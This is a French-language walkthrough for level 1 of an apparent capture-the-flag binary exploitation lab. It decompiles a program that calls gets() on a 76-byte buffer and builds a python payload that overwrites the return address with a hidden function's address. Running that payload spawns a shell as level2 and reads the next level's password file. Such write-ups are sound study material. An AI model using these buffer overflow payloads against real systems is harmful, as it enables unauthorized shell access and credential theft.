# Walkthrough - level1

## ðŸ§© Objectif

Obtenir un shell en tant que `level2` en exploitant une vulnÃ©rabilitÃ© dans le binaire `level1`.

---

## ðŸ” Analyse du binaire

### Ã‰tape 1 : Observation du comportement

En exÃ©cutant simplement le programme :

```bash
$ ./level1
test
```

â†’ Le programme attend une saisie utilisateur, puis quitte.

---

### Ã‰tape 2 : Analyse statique dans Ghidra

Jâ€™ai ouvert le binaire dans Ghidra et observÃ© la fonction `main` suivante :

```c
void main(void) {
    char local_50[76];
    gets(local_50);
    return;
}
```

ðŸ”¸ La fonction `gets()` lit dans un buffer de 76 octets sans aucune protection â†’ **buffer overflow possible**.

---

### Ã‰tape 3 : Rechercher une fonction cachÃ©e

En parcourant la liste des fonctions, jâ€™ai trouvÃ© une fonction nommÃ©e `run`, non appelÃ©e dans `main`, contenant :

```c
void run(void) {
    fwrite("Good... Wait what?\n", 1, 0x13, stdout);
    system("/bin/sh");
}
```

ðŸ”¸ Cette fonction appelle `system("/bin/sh")`, ce qui permet dâ€™ouvrir un shell si elle est appelÃ©e.

Son adresse (trouvÃ©e dans Ghidra) est :  
```
0x08048444
```

---

## ðŸ§ª Exploitation

### Ã‰tape 4 : Calcul de lâ€™offset

Le buffer dans `main` fait 76 octets â†’ EIP est Ã©crasÃ© au **77e octet**.

Il faut donc envoyer :
- 76 octets pour remplir le buffer
- puis lâ€™adresse de la fonction `run()` en little endian (`\x44\x84\x04\x08`)

---

### Ã‰tape 5 : Construction du payload

```bash
$ python3 -c 'print("A"*76 + "\x44\x84\x04\x08")' > /tmp/payload
```

---

### Ã‰tape 6 : ExÃ©cution de lâ€™exploit

```bash
$ cat /tmp/payload - | ./level1
Good... Wait what?
$ whoami
level2
$ cat /home/user/level2/.pass
<mot de passe affichÃ© ici>
```

---

## âœ… RÃ©sultat

Lâ€™exÃ©cution du binaire avec le bon payload mâ€™a permis dâ€™exÃ©cuter la fonction `run()` et dâ€™obtenir un shell sous `level2`. Jâ€™ai ensuite pu lire le mot de passe du niveau suivant.